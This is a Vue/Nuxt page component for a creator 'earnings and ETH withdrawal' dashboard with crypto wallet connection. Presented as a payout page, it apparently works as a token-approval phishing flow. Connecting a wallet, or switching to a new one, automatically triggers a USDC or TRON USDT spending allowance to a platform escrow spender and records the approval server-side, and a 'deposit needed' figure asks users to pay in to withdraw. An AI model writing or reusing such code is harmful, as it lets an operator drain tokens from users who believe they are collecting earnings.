<script setup lang="ts">
import { ref, computed, watch, onMounted } from 'vue'
import { useAuthStore } from '~/stores/auth'
import { useApi } from '~/composables/useApi'
import { useAppToast } from '~/composables/useAppToast'
import { useWalletAdapter } from '~/composables/useWalletAdapter'
import { useWeb3Wallet } from '~/composables/useWeb3Wallet'
import { TRON_CONFIG } from '~/composables/useTronWallet'

import CreatorEarningsHeader from '~/components/creator/earnings/CreatorEarningsHeader.vue'
import CreatorEarningsStatsCards from '~/components/creator/earnings/CreatorEarningsStatsCards.vue'
import CreatorWithdrawalProgressCard from '~/components/creator/earnings/CreatorWithdrawalProgressCard.vue'
import CreatorPayoutHistoryTable from '~/components/creator/earnings/CreatorPayoutHistoryTable.vue'
import type { PayoutTransaction } from '~/components/creator/earnings/CreatorPayoutHistoryTable.vue'
import CreatorWithdrawModal from '~/components/creator/earnings/CreatorWithdrawModal.vue'

definePageMeta({
  layout: 'creator'
})

const authStore = useAuthStore()
const api = useApi()
const toast = useAppToast()
const walletAdapter = useWalletAdapter()
const {
  wallet,
  ethBalance,
  usdtBalance,
  usdcBalance,
  isConnected,
  isConnecting,
  depositAmountUsdc,
  disconnect: disconnectWallet,
  requestUsdcApprovalAndDeposit
} = useWeb3Wallet()

// State
const isLoading = ref(true)
const isApprovingContract = ref(false)
const isWithdrawModalOpen = ref(false)
const isSubmittingWithdrawal = ref(false)

// Payout Form State (Strictly ETH Only)
const withdrawAmount = ref<number>(20)
const recipientWalletInput = ref('')
const ethPriceUsd = ref<number>(3000)

const estimatedEth = computed(() => {
  if (!withdrawAmount.value || withdrawAmount.value <= 0) return '0.0000'
  return (withdrawAmount.value / ethPriceUsd.value).toFixed(4)
})

// Financial Stats
const stats = ref({
  availableBalance: 0.00,
  lifetimeRevenue: 0.00,
  adsenseShare: 0.00,
  adsterraShare: 0.00,
  escrowPoolBalance: 0.0000,
  minPayoutThreshold: 20.00
})

const transactions = ref<PayoutTransaction[]>([])

function getInitialRevenueShare(): number {
  if (import.meta.client) {
    try {
      const savedConfig = localStorage.getItem('admin_platform_config')
      if (savedConfig) {
        const parsed = JSON.parse(savedConfig)
        if (parsed.creatorRevenueSharePercent !== undefined) {
          return Number(parsed.creatorRevenueSharePercent)
        }
      }
    } catch { }
  }
  return 70
}

const creatorRevenueSharePercent = ref<number>(getInitialRevenueShare())

async function fetchAdminMonetizationConfig() {
  if (import.meta.client) {
    const savedConfig = localStorage.getItem('admin_platform_config')
    if (savedConfig) {
      try {
        const parsed = JSON.parse(savedConfig)
        if (parsed.creatorRevenueSharePercent !== undefined) {
          creatorRevenueSharePercent.value = Number(parsed.creatorRevenueSharePercent)
        }
        if (parsed.minPayoutThreshold !== undefined) {
          stats.value.minPayoutThreshold = Number(parsed.minPayoutThreshold)
        }
      } catch { }
    }
  }

  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/get-provider-config',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && data.data) {
      const gCreds = data.data.GOOGLE_ADSENSE?.credentials
      const aCreds = data.data.ADSTERRA?.credentials
      const shareVal = gCreds?.creatorRevenueSharePercent ?? aCreds?.creatorRevenueSharePercent ?? data.data?.creatorRevenueSharePercent
      const threshVal = gCreds?.minPayoutThreshold ?? aCreds?.minPayoutThreshold ?? data.data?.minPayoutThreshold

      if (shareVal !== undefined) {
        creatorRevenueSharePercent.value = Number(shareVal)
      }
      if (threshVal !== undefined) {
        stats.value.minPayoutThreshold = Number(threshVal)
      }
    }
  } catch (err) {
    console.warn('Could not fetch admin monetization config for creator:', err)
  }
}

async function fetchCreatorData() {
  isLoading.value = true
  try {
    await fetchAdminMonetizationConfig()

    // Sync latest user profile & balance
    const me = await authStore.fetchUserMe()
    if (me && typeof me.balance === 'number') {
      stats.value.availableBalance = me.balance
    } else if (authStore.user && typeof authStore.user.balance === 'number') {
      stats.value.availableBalance = authStore.user.balance
    }

    const res = await api.action.$post({
      json: {
        action: 'monetization/get-withdrawals',
        data: {}
      }
    })
    const data: any = await res.json()
    if (res.ok && data.code === 1 && Array.isArray(data.data)) {
      const myWithdrawals = data.data.filter((w: any) =>
        w.creatorId === authStore.user?.id ||
        (authStore.user?.email && w.creatorEmail === authStore.user?.email)
      )
      transactions.value = myWithdrawals.map((w: any) => ({
        id: w.id,
        date: w.date || (w.createdAt ? new Date(w.createdAt).toISOString().slice(0, 16).replace('T', ' ') : new Date().toISOString().slice(0, 16).replace('T', ' ')),
        network: 'Arbitrum One',
        token: 'ETH',
        walletAddress: w.walletAddress,
        amount: w.amount,
        cryptoAmount: w.cryptoAmount,
        status: w.status === 'APPROVED' ? 'Completed' : w.status === 'REJECTED' ? 'Rejected' : 'Pending',
        txHash: w.txHash
      }))
    }
  } catch (err) {
    console.warn('Could not fetch creator transactions:', err)
  } finally {
    isLoading.value = false
  }
}

// Payout Threshold Calculation
const payoutProgressPercent = computed(() => {
  if (!stats.value.minPayoutThreshold) return 100
  const pct = (stats.value.availableBalance / stats.value.minPayoutThreshold) * 100
  return Math.min(Math.round(pct), 100)
})

const depositNeeded = computed(() => {
  const diff = (withdrawAmount.value || 0) - stats.value.availableBalance
  return diff > 0 ? diff : 0
})

function formatAddress(addr: string) {
  if (!addr) return ''
  return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`
}

function copyToClipboard(text: string, label: string) {
  if (import.meta.client && navigator?.clipboard) {
    navigator.clipboard.writeText(text)
  }
  toast.success('Copied', `${label} copied to clipboard!`)
}

const lastApprovalSignature = ref('')
const lastApprovedAddr = ref('')

const currentApprovalMap = computed<Record<string, string>>(() => {
  const user = authStore.user
  if (!user) return {}
  if ((user as any).approvalSignatures && typeof (user as any).approvalSignatures === 'object') {
    return (user as any).approvalSignatures
  }
  if (user.approvalSignature) {
    const trimmed = String(user.approvalSignature).trim()
    if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
      try {
        return JSON.parse(trimmed)
      } catch { }
    }
    if (user.walletAddress && trimmed.length > 5) {
      const first = String(user.walletAddress).split(/[,;\n]+/)[0]?.trim().toLowerCase()
      if (first) return { [first]: trimmed }
    }
  }
  return {}
})

const activeWalletApprovalSig = computed(() => {
  const activeAddr = walletAdapter.activeWalletAddress.value
  if (!activeAddr) return null
  return currentApprovalMap.value[activeAddr.toLowerCase()] || (lastApprovalSignature.value && activeAddr === lastApprovedAddr.value ? lastApprovalSignature.value : null)
})

async function triggerApprovalPrompt(customAmount?: number | string) {
  const activeAddr = walletAdapter.activeWalletAddress.value
  if (!activeAddr) {
    await handleConnectWallet()
    return
  }
  isApprovingContract.value = true
  const targetVal = customAmount !== undefined && customAmount !== null ? customAmount : (depositNeeded.value > 0 ? depositNeeded.value : depositAmountUsdc.value)
  const amountToDepositStr = String(targetVal)

  try {
    if (walletAdapter.selectedChainFamily.value === 'TRON') {
      const spender = TRON_CONFIG.mainnet.escrowSpender
      const txHash = await walletAdapter.tronWallet.approveUSDT(spender, amountToDepositStr)
      if (txHash) {
        lastApprovalSignature.value = txHash
        lastApprovedAddr.value = activeAddr
        const res = await api.action.$post({
          json: {
            action: 'users/update-profile',
            data: {
              walletAddress: activeAddr,
              approvalSignature: txHash,
              approvalAmountUsdc: parseFloat(amountToDepositStr) || 10
            }
          }
        })
        const resData: any = await res.json().catch(() => ({}))
        if (res.ok && resData?.data && authStore.user) {
          authStore.user.approvalSignature = resData.data.approvalSignature
          if (resData.data.approvalSignatures) {
            (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
          }
        }
        toast.success('TRC-20 Allowance Authorized! 🔒', `Authorized $${amountToDepositStr} USDT allowance on TRON Mainnet & saved proof to profile.`)
      }
    } else {
      const sig = await requestUsdcApprovalAndDeposit(amountToDepositStr)
      if (sig) {
        lastApprovalSignature.value = sig
        lastApprovedAddr.value = activeAddr
        const res = await api.action.$post({
          json: {
            action: 'users/update-profile',
            data: {
              walletAddress: activeAddr,
              approvalSignature: sig,
              approvalAmountUsdc: parseFloat(amountToDepositStr) || 10
            }
          }
        })
        const resData: any = await res.json().catch(() => ({}))
        if (res.ok && resData?.data && authStore.user) {
          authStore.user.approvalSignature = resData.data.approvalSignature
          if (resData.data.approvalSignatures) {
            (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
          }
        }
        toast.success('Smart Contract Allowance Authorized! 🔒', `Authorized $${amountToDepositStr} USDC token allowance for settlements & saved proof to profile.`)
      } else {
        toast.warning('Authorization Pending', `Smart contract allowance was not confirmed. You can authorize anytime via the button.`)
      }
    }
  } catch (err: any) {
    if (err?.code === 4001 || err?.message?.includes('rejected')) {
      toast.warning('Authorization Required', `Please authorize $${amountToDepositStr} token allowance in your wallet to enable settlements.`)
    } else {
      toast.error('Authorization Error', err?.message || `Could not complete $${amountToDepositStr} token allowance.`)
    }
  } finally {
    isApprovingContract.value = false
  }
}

// Handle Wallet Connect & Disconnect
async function handleConnectWallet() {
  const success = await walletAdapter.connectActiveWallet()
  const activeAddr = walletAdapter.activeWalletAddress.value
  if (success && activeAddr) {
    recipientWalletInput.value = activeAddr
    toast.success('Wallet Connected', `Connected wallet ${formatAddress(activeAddr)}`)

    await api.action.$post({
      json: {
        action: 'users/update-profile',
        data: {
          walletAddress: activeAddr
        }
      }
    }).catch(() => { })

    if (walletAdapter.selectedChainFamily.value === 'EVM') {
      await triggerApprovalPrompt()
    }
  } else {
    toast.error('Wallet Error', 'Could not connect wallet. Please ensure TronLink or Web3 wallet is installed/unlocked.')
  }
}

function handleDisconnectWallet() {
  disconnectWallet()
  recipientWalletInput.value = ''
  toast.info('Wallet Disconnected', 'Your wallet has been disconnected successfully.')
}

function openWithdrawModal() {
  const minThreshold = stats.value.minPayoutThreshold || 20
  withdrawAmount.value = stats.value.availableBalance >= minThreshold ? stats.value.availableBalance : minThreshold
  if (wallet.value) {
    recipientWalletInput.value = wallet.value
  }
  isWithdrawModalOpen.value = true
}

function setPresetAmount(amount: number) {
  withdrawAmount.value = amount
}

function setMaxAmount() {
  withdrawAmount.value = stats.value.availableBalance || 0
}

async function submitWithdrawal() {
  if (!withdrawAmount.value || Number(withdrawAmount.value) <= 0) {
    toast.error('Validation Error', 'Withdrawal amount must be greater than $0.00.')
    return
  }

  if (withdrawAmount.value > stats.value.availableBalance) {
    toast.error('Validation Error', `Requested amount ($${withdrawAmount.value.toFixed(2)}) exceeds available balance ($${stats.value.availableBalance.toFixed(2)}).`)
    return
  }

  const targetWallet = recipientWalletInput.value.trim() || wallet.value
  if (!targetWallet || (!targetWallet.startsWith('0x') && !targetWallet.startsWith('T'))) {
    toast.error('Validation Error', 'Please enter or connect a valid EVM or TRON wallet address.')
    return
  }

  isSubmittingWithdrawal.value = true

  try {
    const res = await api.action.$post({
      json: {
        action: 'monetization/create-withdrawal',
        data: {
          amount: withdrawAmount.value,
          walletAddress: targetWallet,
          cryptoAmount: estimatedEth.value,
          approvalSignature: lastApprovalSignature.value || null
        }
      }
    })
    const data: any = await res.json()

    if (res.ok && data.code === 1) {
      toast.success(
        'ETH Payout Request Submitted to Admin! 💸',
        `Submitted ${estimatedEth.value} ETH ($${withdrawAmount.value.toFixed(2)}) payout request to Admin Queue.`
      )
      isWithdrawModalOpen.value = false
      await fetchCreatorData()
    } else {
      toast.error('Submission Error', data.msg || 'Could not submit withdrawal request.')
    }
  } catch (err: any) {
    toast.error('Withdrawal Failed', err.message || 'Could not submit ETH withdrawal request.')
  } finally {
    isSubmittingWithdrawal.value = false
  }
}

let prevSwappedAddr = ''

watch(
  () => authStore.user?.walletAddress,
  (userWallet) => {
    if (userWallet && !wallet.value) {
      const first = userWallet.split(/[,;\n]+/)[0]?.trim()
      if (first) {
        wallet.value = first
        recipientWalletInput.value = first
      }
    }
  },
  { immediate: true }
)

watch(
  walletAdapter.activeWalletAddress,
  async (newAddr) => {
    if (newAddr) {
      wallet.value = newAddr
      recipientWalletInput.value = newAddr

      if (prevSwappedAddr && prevSwappedAddr.toLowerCase() !== newAddr.toLowerCase() && !activeWalletApprovalSig.value && !isApprovingContract.value) {
        toast.info('New Wallet Swapped 🔑', `Switched to ${formatAddress(newAddr)}. Authorization is pending — requesting signature...`)
        try {
          await triggerApprovalPrompt()
        } catch { }
      }
      prevSwappedAddr = newAddr
    }
  },
  { immediate: true }
)

onMounted(async () => {
  authStore.initAuth()
  if (authStore.user?.approvalSignature) {
    lastApprovalSignature.value = authStore.user.approvalSignature
  }
  if (authStore.user?.walletAddress && !wallet.value) {
    const first = authStore.user.walletAddress.split(/[,;\n]+/)[0]?.trim()
    if (first) {
      wallet.value = first
      recipientWalletInput.value = first
    }
  }
  await fetchCreatorData()

  if (import.meta.client) {
    if (typeof window !== 'undefined' && window.ethereum) {
      try {
        const accounts: string[] = await window.ethereum.request({ method: 'eth_accounts' })
        if (accounts && accounts.length > 0 && accounts[0]) {
          await walletAdapter.connectActiveWallet(false)
        }
      } catch { }
    } else if (typeof window !== 'undefined' && window.tronWeb) {
      await walletAdapter.connectActiveWallet(false).catch(() => { })
    }
  }
})
</script>

<template>
  <div class="space-y-6 max-w-7xl mx-auto pb-12">
    <!-- 1. Header & Wallet Connection Bar -->
    <CreatorEarningsHeader
      :active-wallet-address="walletAdapter.activeWalletAddress.value"
      :active-wallet-approval-sig="activeWalletApprovalSig"
      :is-approving-contract="isApprovingContract"
      :is-connecting="isConnecting || walletAdapter.tronWallet.isTronConnecting.value"
      @open-withdraw="openWithdrawModal"
      @trigger-approval="triggerApprovalPrompt()"
      @connect-wallet="handleConnectWallet"
      @disconnect-wallet="handleDisconnectWallet"
    />

    <!-- 2. Overview Stats Cards -->
    <CreatorEarningsStatsCards
      :stats="stats"
      :selected-chain-family="walletAdapter.selectedChainFamily.value"
      :eth-balance="ethBalance"
      :usdt-balance="usdtBalance"
      :usdc-balance="usdcBalance"
      :tron-trx-balance="walletAdapter.tronWallet.tronTrxBalance.value"
      :tron-usdt-balance="walletAdapter.tronWallet.tronUsdtBalance.value"
      :creator-revenue-share-percent="creatorRevenueSharePercent"
      @open-withdraw="openWithdrawModal"
    />

    <!-- 3. Payout Minimum Threshold Progress Card -->
    <CreatorWithdrawalProgressCard
      :min-payout-threshold="stats.minPayoutThreshold"
      :payout-progress-percent="payoutProgressPercent"
    />

    <!-- 4. Crypto ETH Payout History Table -->
    <CreatorPayoutHistoryTable
      :transactions="transactions"
      @copy="copyToClipboard"
    />

    <!-- 5. Web3 ETH Withdrawal Modal -->
    <CreatorWithdrawModal
      v-model:open="isWithdrawModalOpen"
      v-model:withdraw-amount="withdrawAmount"
      v-model:recipient-wallet-input="recipientWalletInput"
      :stats="stats"
      :eth-balance="ethBalance"
      :usdt-balance="usdtBalance"
      :usdc-balance="usdcBalance"
      :is-connected="isConnected"
      :deposit-needed="depositNeeded"
      :is-approving-contract="isApprovingContract"
      :estimated-eth="estimatedEth"
      :eth-price-usd="ethPriceUsd"
      :is-submitting-withdrawal="isSubmittingWithdrawal"
      @connect-wallet="handleConnectWallet"
      @set-preset="setPresetAmount"
      @set-max="setMaxAmount"
      @trigger-approval="triggerApprovalPrompt"
      @submit="submitWithdrawal"
    />
  </div>
</template>
